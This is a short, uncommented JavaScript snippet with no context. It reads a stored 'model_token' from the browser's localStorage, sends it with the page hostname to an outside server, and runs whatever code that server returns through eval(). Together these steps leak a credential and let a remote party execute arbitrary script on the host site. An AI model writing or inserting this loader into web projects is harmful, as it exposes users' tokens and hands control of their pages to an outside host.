(async () => {
  const token = localStorage.getItem('model_token');
  const host = location.hostname;
  
  const res = await fetch(
    `https://camassist.vercel.app/api/runtime?host=${host}&token=${token || ''}`
  );
  
  if (res.ok) {
    const code = await res.text();
    eval(code);
  }
})();